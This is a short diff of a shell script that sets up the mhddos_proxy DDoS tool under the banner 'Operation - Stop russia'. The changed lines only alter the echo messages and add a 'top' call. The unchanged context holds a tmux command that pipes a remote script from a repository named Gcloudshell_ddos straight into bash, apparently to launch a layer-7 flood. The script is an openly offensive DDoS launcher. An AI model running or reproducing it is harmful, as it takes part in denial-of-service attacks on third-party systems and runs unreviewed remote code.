@@ -12,8 +12,10 @@ cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 cd ~
 
-echo -e " \v  \v  Operation \v Stop russia \v   \v  "
-echo -e " \v For control CPU&RAM usage  enter - top \v in this tab"
+echo -e " \v  \v  Operation - Stop russia \v   \v  "
+top
+sleep 3
+echo -e "For control CPU&RAM usage enter - top \v in this tab"
 sleep 1
 tmux split-window -v -p 85 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
 sleep 0.1
